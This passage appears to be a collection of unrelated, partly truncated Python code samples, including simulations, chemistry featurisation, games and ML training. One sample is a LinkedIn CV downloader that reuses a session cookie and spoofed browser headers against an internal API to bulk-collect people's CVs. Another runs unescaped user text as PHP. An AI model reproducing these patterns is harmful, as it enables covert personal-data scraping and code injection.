[]\r\n\r\n        directory = self.main_folder_entry.get()\r\n        if directory and os.path.exists(directory):\r\n            self.log(f\"Searching directory: {directory}\")\r\n            for root, dirs, files in os.walk(directory):\r\n                for file in files:\r\n                    if file.endswith(\".json\"):\r\n                        file_path = os.path.join(root, file)\r\n                        self.log(f\"Searching file: {file_path",
    "from math import sin, cos, atan2, radians, degrees\nfrom random import randint\nimport pygame as pg\n\nFLLSCRN = False         # True for Fullscreen, or False for Window\nBOIDZ = 130             # How many boids to spawn, may slow after 200ish\nWRAP = False            # False avoids edges, True wraps boids to other side\nFISH = False            # True will turn boids into fish\nBGCOLOR = (0, 0, 0)     # Background color in RGB\nWIDTH = 1200            # default 1200\nHEIGHT = 800            # default 800\nFPS = 48                # 48-90\n\nclass Boid(pg.sprite.Sprite):\n    def __init__(self, drawSurf, isFish=False, cHSV=None):\n        super().__init__()\n        self.drawSurf = drawSurf\n        self.image = pg.Surface((15, 15))\n        self.image.set_colorkey(0)\n        randColor = pg.Color(0)  # preps color so we can use hsva\n        if cHSV is None:\n            cHSV = (randint(0, 360), 85, 85, 100)  # Default values for hue, saturation, value, alpha\n        else:\n            cHSV += (100,)  # Adding default alpha value if not provided\n        randColor.hsva = cHSV\n        if isFish:\n            pg.draw.polygon(self.image, randColor, ((7,0), (12,5), (3,14), (11,14), (2,5), (7,0)), width=3)\n            self.image = pg.transform.scale(self.image, (18, 28))\n        else:\n            pg.draw.polygon(self.image, randColor, ((7,0), (13,14), (7,11), (1,14), (7,0)))\n        self.pSpace = (self.image.get_width() + self.image.get_height()) / 2\n        self.orig_image = pg.transform.rotate(self.image.copy(), -90)\n        self.direction = pg.Vector2(1, 0)  # sets up forward direction\n        dS_w, dS_h = self.drawSurf.get_size()\n        self.rect = self.image.get_rect(center=(randint(50, dS_w - 50), randint(50, dS_h - 50)))\n        self.angle = randint(0, 360)  # random start angle, and position ^\n        self.pos = pg.Vector2(self.rect.center)\n\n    def update(self, allBoids, dt, ejWrap=False):  # behavior\n        selfCenter = pg.Vector2(self.rect.center)\n        curW, curH = self.drawSurf.get_size()\n        turnDir = xvt = yvt = yat = xat = 0\n        turnRate = 120 * dt\n        margin = 48\n        neiboids = sorted([  # gets list of nearby boids, sorted by distance\n            iBoid for iBoid in allBoids\n            if pg.Vector2(iBoid.rect.center).distance_to(selfCenter) < self.pSpace*12 and iBoid != self ],\n            key=lambda i: pg.Vector2(i.rect.center).distance_to(selfCenter)) # 200\n        del neiboids[7:]  # keep 7 closest, dump the rest\n        ncount = len(neiboids)\n        if ncount > 1:  # when boid has neighborS (walrus sets ncount)\n            nearestBoid = pg.Vector2(neiboids[0].rect.center)\n            for nBoid in neiboids:  # adds up neighbor vectors & angles for averaging\n                xvt += nBoid.rect.centerx\n                yvt += nBoid.rect.centery\n                yat += sin(radians(nBoid.angle))\n                xat += cos(radians(nBoid.angle))\n            tAvejAng = degrees(atan2(yat, xat)) #round()\n            targetV = (xvt / ncount, yvt / ncount)\n            # if too close, move away from closest neighbor\n            if selfCenter.distance_to(nearestBoid) < self.pSpace : targetV = nearestBoid\n            tDiff = targetV - selfCenter  # get angle differences for steering\n            tDistance, tAngle = pg.math.Vector2.as_polar(tDiff)\n            # if boid is close enough to neighbors, match their average angle\n            if tDistance < self.pSpace*6 : tAngle = tAvejAng # and ncount > 2\n            # computes the difference to reach target angle, for smooth steering\n            angleDiff = (tAngle - self.angle) + 180\n            if abs(tAngle - self.angle) > .8: turnDir = (angleDiff / 360 - (angleDiff // 360)) * 360 - 180\n            # if boid gets too close to target, steer away\n            if tDistance < self.pSpace and targetV == nearestBoid : turnDir = -turnDir\n        # Avoid edges of screen by turning toward the edge normal-angle\n        if not ejWrap and min(self.pos.x, self.pos.y, curW - self.pos.x, curH - self.pos.y) < margin:\n            if self.pos.x < margin : tAngle = 0\n            elif self.pos.x > curW - margin : tAngle = 180\n            if self.pos.y < margin : tAngle = 90\n            elif self.pos.y > curH - margin : tAngle = 270\n            angleDiff = (tAngle - self.angle) + 180\n            turnDir = (angleDiff / 360 - (angleDiff // 360)) * 360 - 180\n            edgeDist = min(self.pos.x, self.pos.y, curW - self.pos.x, curH - self.pos.y)\n            turnRate = turnRate + (1 - edgeDist / margin) * (20 - turnRate) #minRate+(1-dist/margin)*(maxRate-minRate)\n        if turnDir != 0:  # steers based on turnDir, handles left or right\n            self.angle += turnRate * abs(turnDir) / turnDir\n            self.angle %= 360\n        # adjusts angle of boid image to match heading\n        self.image = pg.transform.rotate(self.orig_image, -self.angle)\n        self.rect = self.image.get_rect(center=self.rect.center)  # recentering fix\n        self.direction = pg.Vector2(1, 0).rotate(self.angle).",
    "import requests\nimport json\nimport re\nimport os\nimport tkinter as tk\nfrom time import sleep\nfrom threading import Thread\n\n# This project is exclusively developed by https://github.com/TufayelLUS\n# Tested as working on Windows 11 Home, 03 April, 2024\n# Any problems with your LinkedIn account after using this program will not be any of my liabilities\n# Contact me for software development offers: https://www.linkedin.com/in/tufayel-ahmed-cse\n\n\ncookies = open('cookies.txt', mode='r', encoding='utf-8').read().split('\\n')[0]\ncv_save_folder = \"CVs\"\nrequest_delay = 5\nlog_file = \"logs.log\"\n\n\ndef print_log(text):\n    with open(log_file, \"a\") as f:\n        f.write(text + \"\\n\")\n\n\nclass CVDownloader():\n\n    def __init__(self) -> None:\n        pass\n\n    def start(self):\n        root = tk.Tk()\n        root.title(\"LinkedIn CV Downloader - By Tufayel\")\n        root.geometry(\"800x600\")\n        root.resizable(False, False)\n        label = tk.Label(\n            root, text=\"LinkedIn CV Downloader - By Tufayel\", font=(\"Helvetica\", 20))\n        label.pack(pady=20)\n        intro_label = tk.Label(\n            root, text=\"Download bulk CV in a short time! Get them saved in a specified folder!\")\n        intro_label.pack(pady=0)\n        instruction_label = tk.Label(\n            root, text=\"Enter LinkedIn profile links below, one per line. ex. https://www.linkedin.com/in/tufayel-ahmed-cse/\")\n        instruction_label.pack(pady=20)\n        self.link_entry = tk.Text(root, width=60, height=10)\n        self.link_entry.pack(pady=20, padx=20, fill=tk.BOTH, expand=True)\n        frame = tk.Frame(root)\n        self.delay_var = tk.StringVar(frame)\n        text_label = tk.Label(\n            frame, text=\"Delay in seconds between each profile downloaded: \")\n        text_label.pack(side=tk.LEFT)\n        self.delay_slider = tk.Spinbox(\n            frame, from_=1, to=60, width=5, textvariable=self.delay_var, state='readonly')\n        self.delay_var.set(str(request_delay))\n        self.delay_slider.pack(pady=20)\n        frame.pack()\n        self.download_button = tk.Button(\n            root, text=\"Start Downloading CV\", command=self.startProcessLinkThread)\n        self.download_button.pack()\n        self.link_entry.focus()\n        self.status_bar = tk.Label(root, text=\"\")\n        self.status_bar.pack(pady=20)\n        root.mainloop()\n\n    def requestCV(self, profile_id, profile_link):\n        link = \"https://www.linkedin.com/voyager/api/graphql\"\n        params = {\n            'action': 'execute',\n            'queryId': 'voyagerIdentityDashProfileActionsV2.ca80b3b293240baf5a00226d8d6d78a1'\n        }\n        headers = {\n            'Accept': 'application/vnd.linkedin.normalized+json+2.1',\n            'Cookie': cookies,\n            'Csrf-Token': re.findall(r'JSESSIONID=\"(.+?)\"', cookies)[0],\n            'Dnt': '1',\n            'Referer': profile_link,\n            'Sec-Ch-Ua': '\"Not A(Brand\";v=\"99\", \"Google Chrome\";v=\"121\", \"Chromium\";v=\"121\"',\n            'Sec-Ch-Ua-Mobile': '?0',\n            'Sec-Ch-Ua-Platform': '\"Windows\"',\n            'Sec-Fetch-Dest': 'empty',\n            'Sec-Fetch-Mode': 'cors',\n            'Sec-Fetch-Site': 'same-origin',\n            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',\n            'X-Li-Lang': 'en_US',\n            'X-Li-Page-Instance': 'urn:li:page:d_flagship3_search_srp_people_load_more;Ux/gXNk8TtujmdQaaFmrPA==',\n            'X-Li-Track': '{\"clientVersion\":\"1.13.9792\",\"mpVersion\":\"1.13.9792\",\"osName\":\"web\",\"timezoneOffset\":6,\"timezone\":\"Asia/Dhaka\",\"deviceFormFactor\":\"DESKTOP\",\"mpName\":\"voyager-web\",\"displayDensity\":1.3125,\"displayWidth\":1920.1875,\"displayHeight\":1080.1875}',\n            'X-Restli-Protocol-Version': '2.0.0',\n        }\n        data = {\n            \"variables\": {\n                \"profileUrn\": \"urn:li:fsd_profile:{}\".format(profile_id)\n            },\n            \"queryId\": \"voyagerIdentityDashProfileActionsV2.ca80b3b293240baf5a00226d8d6d78a1\",\n            \"includeWebMetadata\": True\n        }\n        try:\n            resp = requests.post(link, headers=headers,\n                                 params=params, data=json.dumps(data)).json()\n        except:\n            print_log(\"Failed to open {}\".format(link))\n            return None\n        try:\n            cv_pdf_link = resp.get('data').get('data').get(\n                'doSaveToPdfV2IdentityDashProfileActionsV2').get('result').get('downloadUrl')\n        except:\n            print_log(\"Error processing CV link\")\n            return None\n        return cv_pdf_link\n\n    def downloadCV(self, link, username):\n        print_log(\"Downloading CV from {}\".format(link))\n        headers = {\n            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',\n            'Accept-Encoding': 'gzip, deflate, br',\n            'Accept-Language': 'en-US,en;q=0.9',\n            'Cookie': cookies,\n            ",
    "import numpy as np\n\nfrom rdkit import Chem\n\n\ndef one_hot_encoding(x, permitted_list):\n    if x not in permitted_list:\n        x = permitted_list[-1]\n\n    binary_encoding = [\n        int(boolean_value)\n        for boolean_value in list(map(lambda s: x == s, permitted_list))\n    ]\n\n    return binary_encoding\n\n\ndef get_atom_features(atom, use_chirality=True, hydrogens_implicit=True):\n    permitted_list_of_atoms = [\n        \"C\",\n        \"N\",\n        \"O\",\n        \"S\",\n        \"F\",\n        \"Si\",\n        \"P\",\n        \"Cl\",\n        \"Br\",\n        \"Mg\",\n        \"Na\",\n        \"Ca\",\n        \"Fe\",\n        \"As\",\n        \"Al\",\n        \"I\",\n        \"B\",\n        \"V\",\n        \"K\",\n        \"Tl\",\n        \"Yb\",\n        \"Sb\",\n        \"Sn\",\n        \"Ag\",\n        \"Pd\",\n        \"Co\",\n        \"Se\",\n        \"Ti\",\n        \"Zn\",\n        \"Li\",\n        \"Ge\",\n        \"Cu\",\n        \"Au\",\n        \"Ni\",\n        \"Cd\",\n        \"In\",\n        \"Mn\",\n        \"Zr\",\n        \"Cr\",\n        \"Pt\",\n        \"Hg\",\n        \"Pb\",\n        \"Unknown\",\n    ]\n\n    if hydrogens_implicit == False:\n        permitted_list_of_atoms = [\"H\"] + permitted_list_of_atoms\n\n    atom_type_enc = one_hot_encoding(\n        str(atom.GetSymbol()), permitted_list_of_atoms)\n\n    n_heavy_neighbors_enc = one_hot_encoding(\n        int(atom.GetDegree()), [0, 1, 2, 3, 4, \"MoreThanFour\"]\n    )\n\n    formal_charge_enc = one_hot_encoding(\n        int(atom.GetFormalCharge()), [-3, -2, -1, 0, 1, 2, 3, \"Extreme\"]\n    )\n\n    hybridisation_type_enc = one_hot_encoding(\n        str(atom.GetHybridization()),\n        [\"S\", \"SP\", \"SP2\", \"SP3\", \"SP3D\", \"SP3D2\", \"OTHER\"],\n    )\n\n    is_in_a_ring_enc = [int(atom.IsInRing())]\n\n    is_aromatic_enc = [int(atom.GetIsAromatic())]\n\n    atomic_mass_scaled = [float((atom.GetMass() - 10.812) / 116.092)]\n\n    vdw_radius_scaled = [\n        float((Chem.GetPeriodicTable().GetRvdw(atom.GetAtomicNum()) - 1.5) / 0.6)\n    ]\n\n    covalent_radius_scaled = [\n        float((Chem.GetPeriodicTable().GetRcovalent(\n            atom.GetAtomicNum()) - 0.64) / 0.76)\n    ]\n\n    atom_feature_vector = (\n        atom_type_enc\n        + n_heavy_neighbors_enc\n        + formal_charge_enc\n        + hybridisation_type_enc\n        + is_in_a_ring_enc\n        + is_aromatic_enc\n        + atomic_mass_scaled\n        + vdw_radius_scaled\n        + covalent_radius_scaled\n    )\n\n    if use_chirality:\n        chirality_type_enc = one_hot_encoding(\n            str(atom.GetChiralTag()),\n            [\n                \"CHI_UNSPECIFIED\",\n                \"CHI_TETRAHEDRAL_CW\",\n                \"CHI_TETRAHEDRAL_CCW\",\n                \"CHI_OTHER\",\n            ],\n        )\n        atom_feature_vector += chirality_type_enc\n\n    if hydrogens_implicit:\n        n_hydrogens_enc = one_hot_encoding(\n            int(atom.GetTotalNumHs()), [0, 1, 2, 3, 4, \"MoreThanFour\"]\n        )\n        atom_feature_vector += n_hydrogens_enc\n\n    return np.array(atom_feature_vector)\n\n\ndef get_bond_features(bond, use_stereochemistry=True):\n    permitted_list_of_bond_types = [\n        Chem.rdchem.BondType.SINGLE,\n        Chem.rdchem.BondType.DOUBLE,\n        Chem.rdchem.BondType.TRIPLE,\n        Chem.rdchem.BondType.AROMATIC,\n    ]\n\n    bond_type_enc = one_hot_encoding(\n        bond.GetBondType(), permitted_list_of_bond_types)\n\n    bond_is_conj_enc = [int(bond.GetIsConjugated())]\n\n    bond_is_in_ring_enc = [int(bond.IsInRing())]\n\n    bond_feature_vector = bond_type_enc + bond_is_conj_enc + bond_is_in_ring_enc\n\n    if use_stereochemistry:\n        stereo_type_enc = one_hot_encoding(\n            str(bond.GetStereo()), [\"STEREOZ\",\n                                    \"STEREOE\", \"STEREOANY\", \"STEREONONE\"]\n        )\n        bond_feature_vector += stereo_type_enc\n\n    return np.array(bond_feature_vector)\n",
    "import re\nimport os\nimport sys\nimport subprocess\n\nis_python_ibrary = False\n\nclass Markup:\n    def __init__(self, text):\n        self.text = text\n        self.html = \"\"\n        self.php = \"\"\n        self.php_file = \"\"\n        self.php_file_name = \"\"\n        self.theme = \"light\"\n\n    def compile(self):\n        self.compile_html()\n        self.compile_php()\n\n    def compile_html(self):\n        self.html = self.text\n        theme_used = False\n        if re.search(r'::theme-preset{(light)}', self.html):\n            self.html = re.sub(r'::theme-preset{(light)}', r'<div class=\"theme-light\">', self.html)\n            theme_used = True\n            self.theme = \"light\"\n        if re.search(r'::theme-preset{(dark)}', self.html):\n            self.html = re.sub(r'::theme-preset{(dark)}', r'<div class=\"theme-dark\">', self.html)\n            theme_used = True\n            self.theme = \"dark\"\n        if re.search(r'::theme-preset{(system)}', self.html):\n            self.html = re.sub(r'::theme-preset{(system)}', r'<div class=\"theme-system\">', self.html)\n            theme_used = True\n            self.theme = \"system\"\n        self.html = re.sub(r'###### (.*?)\\n', r'<h6>\\1</h6>', self.html)\n        self.html = re.sub(r'##### (.*?)\\n', r'<h5>\\1</h5>', self.html)\n        self.html = re.sub(r'#### (.*?)\\n', r'<h4>\\1</h4>', self.html)\n        self.html = re.sub(r'### (.*?)\\n', r'<h3>\\1</h3>', self.html)\n        self.html = re.sub(r'## (.*?)\\n', r'<h2>\\1</h2>', self.html)\n        self.html = re.sub(r'# (.*?)\\n', r'<h1>\\1</h1>', self.html)\n        self.html = re.sub(r'\\*\\*(.*?)\\*\\*', r'<b>\\1</b>', self.html)\n        self.html = re.sub(r'\\*(.*?)\\*', r'<i>\\1</i>', self.html)\n        self.html = re.sub(r'__(.*?)__', r'<u>\\1</u>', self.html)\n        self.html = re.sub(r'_(.*?)_', r'<i>\\1</i>', self.html)\n        self.html = re.sub(r'~~(.*?)~~', r'<s>\\1</s>', self.html)\n        self.html = re.sub(r'`(.*?)`', r'<code>\\1</code>', self.html)\n        self.html = re.sub(r'\\[(.*?)\\]\\((.*?)\\)', r'<a href=\"\\2\">\\1</a>', self.html)\n        self.html = re.sub(r'\\n', r'<br>', self.html)\n        if theme_used:\n            self.html += \"</div>\"\n        return self.html\n\n    def compile_php(self):\n        self.php = \"<?php\\n\"\n        self.php += \"echo <<<EOT\\n\"\n        self.php += \"<!DOCTYPE html>\\n\"\n        self.php += \"<html>\\n\"\n        self.php += \"<head>\\n\"\n        self.php += \"<style>\\n\"\n        self.php += \"a { color: inherit; font-weight: 700; }\\n\"\n        self.php += \".theme-light { --bg-color: #ffffff; --text-color: #000000; --code-bg-color: #e8e8e8; }\\n\"\n        self.php += \".theme-dark { --bg-color: #1a202c; --text-color: #Cbd5e0; --code-bg-color: #44475a; }\\n\"\n        self.php += \".theme-system { --bg-color: #ffffff; --text-color: #000000; --code-bg-color: #e8e8e8; }\\n\"\n        self.php += \"@media (prefers-color-scheme: dark) { .theme-system { --bg-color: #1a202c; --text-color: #Cbd5e0; --code-bg-color: #44475a; } }\\n\"\n        self.php += \"body { background-color: var(--bg-color); color: var(--text-color); }\\n\"\n        self.php += \"code { background-color: var(--code-bg-color); padding: 0.2em 0.4em; margin: 0; font-size: 85%; border-radius: 6px; }\\n\"\n        self.php += \"</style>\\n\"\n        self.php += \"</head>\\n\"\n        self.php += \"<body \" + (\"class='theme-\" + self.theme + \"'\" if self.theme else \"light\") + \">\\n\"\n        self.php += self.html\n        self.php += \"</body>\\n\"\n        self.php += \"</html>\\n\"\n        self.php += \"\\nEOT;\\n\"\n        self.php += \"?>\\n\"\n        return self.php\n\n    def write_php_file(self, file_name):\n        self.php_file_name = file_name\n        self.php_file = open(file_name, \"w\")\n        self.php_file.write(self.php)\n        self.php_file.close()\n\ndef read_lfe(file_name):\n    file = open(file_name, \"r\")\n    text = file.read()\n    file.close()\n    return text\n\nclass Interpreter:\n    def __init__(self, text=\"\", is_in_library=True):  # Add is_in_library parameter\n        self.is_in_library = is_in_library  # Store it in an instance variable\n        if is_in_library and not text:\n            raise ValueError(\"Text must be provided when in library mode.\")\n            \n        self.text = text\n        base_name = \"output\"\n        self.markup = Markup(self.text)\n        self.markup.compile()\n        php = self.markup.php\n        open(base_name + \".php\", \"w\").write(php)\n        subprocess.run([\"php\", base_name + \".php\"])\n\nif __name__ == \"__main__\":\n    if len(sys.argv) < 2:\n        print(\"Usage: python interpreter.py <file_name>\")\n    else:\n        interpreter = Interpreter(sys.argv[1])",
    "from module.text_artisan import TextArtisan\nfrom datetime import datetime\n\nbanner = \"\"\"\n+------------------------------------------+\n|                 Logifyr                  |\n|                =========                 |\n|        Author : Prashant Bhandari        |\n+------------------------------------------+\n| Logifyr is a Python class designed       |\n| to facilitate logging with customizable  |\n| timestamp formats and colored output.    |\n+------------------------------------------+\n\"\"\"\n\nclass Logifyr(TextArtisan):\n    \n    # Default color mapping\n    status_colors = {\n        \"INFO\": \"green\",\n        \"WARNING\": \"yellow\",\n        \"ERROR\": \"red\",\n        \"DEBUG\": \"blue\",\n        # Add more statuses and corresponding colors as needed\n    }\n\n    def __init__(self, timestamp_format=\"%Y-%m-%d %H:%M:%S\", color_enabled=True):\n        super().__init__()\n        self.timestamp_format = timestamp_format\n        self.color_enabled = color_enabled\n\n    def print_log(self, status, message):\n        timestamp = datetime.now().strftime(self.timestamp_format)\n        status_color = self.status_colors.get(status.upper(), \"white\") if self.color_enabled else \"white\"\n        status_style = [self.COLORS[status_color.lower()]] if self.color_enabled else []\n        log_message = f\"[{timestamp}] \" + self.decorate(status_style, f\"[{status.upper()}]\") + f\" {message}\"\n        print(log_message)\n\n    def set_status_color(self, status, color):\n        \"\"\"\n        Set color for a specific status.\n        \"\"\"\n        self.status_colors[status.upper()] = color.lower()  # Convert color to lowercase for consistency\n\n    def set_timestamp_format(self, timestamp_format):\n        \"\"\"\n        Set the format for the timestamp.\n        \"\"\"\n        self.timestamp_format = timestamp_format\n\n    def enable_color(self):\n        \"\"\"\n        Enable colorized output.\n        \"\"\"\n        self.color_enabled = True\n\n    def disable_color(self):\n        \"\"\"\n        Disable colorized output.\n        \"\"\"\n        self.color_enabled = False\n\nif __name__ == \"__main__\":\n    print(TextArtisan.decorate([TextArtisan.BOLD,TextArtisan.COLORS[\"green\"]],banner))\n    logger = Logifyr()\n    logger.print_log(\"INFO\", \"Initializing Logifyr \ud83d\ude80.\")\n    logger.print_log(\"WARNING\", \"Just Joking \ud83c\udf89.\")\n    logger.print_log(\"ERROR\", \"Logifyr Terminated \u274c.\")",
    "import string\nsymbols = string.printable\n#get's all possible words (ascii combos)\n#creates our dictionary of all possible ascii words\ndef make_dic(length, word):\n    if not length:\n        yield word\n    else:\n        for i in symbols:\n            yield from make_dic(length-1, word+i)\n\ndef make_book(size, words, curr):\n    if not size:\n        yield curr\n    else:\n        for gen in words:\n            for word in gen:\n                yield from make_book(size-1, words, curr + \" \" + word)\n\n\n#using generators so it doesn't immedietley crash\n#longest word in a major dictionary is 45\n#but the longest publishd word is 1,909. We will limit our words to this size\n#it will still be an infinite library just a smaller one\ndef main():\n    #will be a list containing generators of generators\n    words = []\n    for i in range(1909):\n        for s in symbols:\n            words.append(make_dic(i,s))\n    library = []\n    count = 0\n    while True:\n        for gen in words:\n            for word in gen:\n                library.append(make_book(count, words, word))\n\nif __name__ == '__main__':\n    main()\n",
    "import pandas as pd\nimport numpy as np\nfrom openai import OpenAI # openai version: 1.6.1\nimport tiktoken \nimport re # package for removing special characters strings \nimport json\nimport random\nfrom openai import AsyncOpenAI \nimport asyncio \nimport sys \nimport datetime as datetime\nimport fsspec\nimport s3fs\nimport time\nimport os\n\n########################################### Pre API Call Processing Functions  ##############################################################################\n\n\n# helper functions to count number of tokens in each text value \ndef num_tokens_from_string(string: str, encoding_name: str) -> int:\n    \"\"\"Returns the number of tokens in a text string.\"\"\"\n    encoding = tiktoken.get_encoding(encoding_name)\n    num_tokens = len(encoding.encode(string))\n    return num_tokens\n\ndef remove_special_characters(text):\n    \"\"\"Returns only the non special characters within a string\"\"\"\n    text = str(text)\n    pattern = r'[^a-zA-Z0-9\\s]' # This pattern will remove anything that is not alphanumeric or whitespace\n    clean_text = re.sub(pattern, '', text)\n    return clean_text\n\n\ndef collapse_text_values_to_csv_groups(data, text_variable, tokens_per_group): \n    \"\"\"Groups together the text values into groups no bigger then the tokens per groups\n        Must already have `text_value_id` column\"\"\"\n    \n    print(\"collapsing raw text values into .csv groups for api call\")\n\n    # remove special characters from the text data \n    data['text_values_clean'] = data[text_variable].apply(lambda x: remove_special_characters(x))\n\n    # create a column with the count of tokens in each text value \n    data['token_count'] = data[\"text_values_clean\"].apply(lambda x: num_tokens_from_string(x, \"cl100k_base\")) \n\n    # create a column that is the cumulative sum of the token column \n    data['token_count_cumsum'] = data['token_count'].cumsum()\n\n    # use the interger division operator to create api call groups \n    data['api_call_group'] = data['token_count_cumsum'] // tokens_per_group\n\n    # add id to text value \n    data['text_values_clean'] = data['text_value_id'].astype(str) + \" \" + data['text_values_clean'] \n\n    # keep variable(s) to be used to be feed into chatgpt\n    prep_data = data[[\"text_values_clean\", \"api_call_group\"]]\n\n    # group by text values \n    prep_data = prep_data.groupby('api_call_group').agg({'text_values_clean': lambda x: ', '.join(map(str, x))})\n\n    return prep_data \n\ndef create_category_id_key(categories_df): \n    \n    print('creating category id key to keep track of categories gpt chooses')\n    categories_df = categories_df.reset_index()\n\n    # create a unique id for each category (always 2 digit number)\n    categories_df['category_id'] = categories_df.index + 10\n\n    # TODO: add a warning if the number of categories exceeds 90\n    return categories_df\n\ndef create_system_instructions(gpt_directions, category_id_key, other_category): \n    \"\"\"takes in the gpt_directions defined by the user and the category_id_key defined earlier\"\"\"\n    print('bind together system instructions based on user inputs')\n    \n    if other_category == True: \n        other = \"If you are uncertain, then choose 99 for the 'Other' category.\\n\"\n        other_category = \"\\n - Other (99)\\n\"\n    else: \n        other = \"The 'Other' category is not applicable for this prompt. Please select the most appropriate category from the provided options.\\n\"\n        other_category = \"\"\n    # turn categories list into one string with the category id attatched \n    # attatched the unique id for each category to the end of the category string \n    category_id_key['category_clean'] = \"- \" + category_id_key['category'] + \" (\" + category_id_key['category_id'].astype(str) + \")\"\n\n    # select only category clean \n    category_id_key = category_id_key[['category_clean']]\n\n    # collapse categories down into one string value \n    category_id_key['group'] = 1 \n    categories_string = category_id_key.groupby('group').agg({'category_clean': lambda x: '\\n '.join(map(str, x))})\n    categories_string = categories_string['category_clean'][1]\n\n    json_request = '''You will output this as a JSON document {expense id:category id number}\\n'''\n    \n    # Join together entire system instructions\n    system_instructions = gpt_directions +  other + json_request + categories_string + other_category\n\n    return system_instructions\n\n########################################### Post API Call Processing Functions  ##############################################################################\n\ndef extract_raw_logprob_data(logprobs_content, output):\n\n     # Create empty lists to be filled with the logprob content \n    token_list = []\n    logprob_list = []  \n\n    # loop through logprobs content, each item is a list for each token\n    for item in logprobs_content: \n        # select the top log probs section which contains the data we want for each token \n        topLogprobs = item.top_logprobs[0]\n        # loop through each top log probs list for each token\n        for topLog",
    "from turtle import Screen\r\nfrom snake import Snake\r\nfrom food import Food\r\nfrom scoreboard import Scoreboard\r\nimport time\r\n\r\nscreen = Screen()\r\nscreen.setup(width = 600, height = 600)\r\nscreen.bgcolor(\"black\")\r\nscreen.title(\"Snake Game\")\r\nscreen.tracer(0)\r\n\r\nsnake = Snake()\r\nfood = Food()\r\nscoreboard = Scoreboard()\r\n\r\nscreen.listen()\r\nscreen.onkey(snake.up,\"Up\")\r\nscreen.onkey(snake.down,\"Down\")\r\nscreen.onkey(snake.left,\"Left\")\r\nscreen.onkey(snake.right,\"Right\")\r\n\r\n\r\ngame_is_on = True\r\nwhile game_is_on:\r\n  screen.update()\r\n  time.sleep(0.1)\r\n  snake.move()\r\n\r\n#Detecting the food collision with snake\r\n  if snake.head.distance(food) < 15 :\r\n    food.refresh()\r\n    snake.extend()\r\n    scoreboard.increase_score()\r\n\r\n#Detecing the wall collision with snake\r\n  if snake.head.xcor() > 280 or snake.head.xcor()  < -280 or snake.head.ycor() > 280 or snake.head.ycor() < -280:\r\n      game_is_on = False\r\n      scoreboard.game_over()\r\n\r\n#Detecting the tail collision with snake\r\n#if the head collide with any segment of the snake then, game over\r\n  for segment in snake.segments[1:]:\r\n    if snake.head.distance(segment) < 10:\r\n      game_is_on = False\r\n      scoreboard.game_over()\r\n    \r\n  \r\n\r\nscreen.exitonclick()\r\n",
    "import cv2\r\nimport numpy as np\r\nimport torch\r\nfrom torchvision.datasets import MNIST\r\nfrom torchvision.transforms import (\r\n    ToTensor,\r\n    Normalize,\r\n    Compose,\r\n    RandomRotation,\r\n    RandomAffine,\r\n    RandomHorizontalFlip,\r\n    RandomCrop,\r\n    RandomApply,\r\n    ColorJitter,\r\n    GaussianBlur,\r\n)\r\nimport torch.nn as nn\r\nimport torch.nn.functional as F\r\nimport torch.optim as optim\r\nimport matplotlib.pyplot as plt\r\nfrom torch.utils.data import DataLoader, random_split\r\nfrom digits import show_digits_boundry\r\n\r\n# ------------------------------ preproccessing -----------------------------\r\n# Define the training transformations\r\ntransform_train = Compose(\r\n    [\r\n        # RandomCrop(29, padding=4),\r\n        # RandomApply([GaussianBlur(3, sigma=(0.1, 2))], p=0.5),\r\n        # ColorJitter(brightness=0.2, contrast=0.2, saturation=0.2, hue=0.05),\r\n        RandomRotation(degrees=(-20, 20)),\r\n        # RandomAffine(degrees=0, translate=(0.1, 0.1)),\r\n        # RandomHorizontalFlip(),\r\n        ToTensor(),\r\n        Normalize((0.13072014), (0.30810788)),\r\n    ]\r\n)\r\n\r\n# For validation set: no rotation\r\ntransform = Compose([ToTensor(), Normalize((0.13072014), (0.30810788))])\r\n\r\n# train data\r\ntrain_data = MNIST(\r\n    root=\"data\",\r\n    train=True,\r\n    download=True,\r\n    transform=transform_train,\r\n)\r\n\r\n# test data\r\ntest_data = MNIST(root=\"data\", train=False, download=True, transform=transform)\r\n# print(train_data[0][0].shape)\r\n\r\n# Define constants\r\ntrain_batch_size = 64\r\ntest_batch_size = 64\r\nepochs = 5\r\nlr = 0.001\r\n# momentum is designed to accelerate learning for SGD\r\nmomentum = 0.05\r\n\r\n\r\ntrain_accuracies = []\r\ntrain_losses = []\r\nval_accuracies = []\r\nval_losses = []\r\ntest_accuracies = []\r\ntest_losses = []\r\n# Define the paths for saving the model and optimizer state.\r\nmodelPath = \"pth/m.pth\"   # Path where the trained model will be saved.\r\noptimizerPath = \"pth/o.pth\"  # Path where the optimizer state will be saved.\r\n\r\n# Initialize a random generator with a fixed seed for reproducibility.\r\ngenerator1 = torch.Generator().manual_seed(42)\r\n\r\n# Split the training data into training and validation datasets using an 80-20 split.\r\ntraindata, valdata = random_split(train_data, [0.8, 0.2], generator=generator1)\r\n\r\n# Create a DataLoader for the training data.\r\ntrain_loader = DataLoader(traindata, batch_size=train_batch_size, shuffle=True)\r\n\r\n#set costum transform\r\nvaldata.dataset.transform = transform\r\n# Validate DataLoader\r\nval_loader = DataLoader(valdata, batch_size=train_batch_size, shuffle=False)\r\n\r\n# Test DataLoader\r\ntest_loader = DataLoader(test_data, batch_size=test_batch_size)\r\n\r\n\r\n# Define Neural Network class\r\nclass NN_CNN(nn.Module):\r\n    def __init__(self):\r\n        super(NN_CNN, self).__init__()\r\n        self.conv1 = nn.Conv2d(1, 10, kernel_size=5, stride=1)\r\n        self.conv2 = nn.Conv2d(10, 20, kernel_size=5, stride=1)\r\n        self.fc1 = nn.Linear(320, 220)\r\n        self.fc2 = nn.Linear(220, 150)\r\n        self.fc3 = nn.Linear(150, 10)\r\n        self.drop = nn.Dropout(p=0.5)\r\n\r\n    def forward(self, x):\r\n        x = F.max_pool2d(F.relu(self.conv2(F.max_pool2d(F.relu(self.conv1(x)), 2))), 2)\r\n        x = x.view(-1, 320)\r\n        x = self.fc3(self.drop(F.relu(self.fc2(self.drop(F.relu(self.fc1(x)))))))\r\n        x = F.relu(x)\r\n        return x\r\n\r\n#create an instance of our neural CNN model\r\nmodel = NN_CNN()\r\n# print(model)\r\n\r\n#Define optimazer and loss function\r\nloss = nn.CrossEntropyLoss()\r\n# optimizer = optim.SGD(model.parameters(), lr=lr, momentum=momentum)\r\noptimizer = optim.Adam(model.parameters(), lr=lr)\r\n#\r\ndef train_model(model, 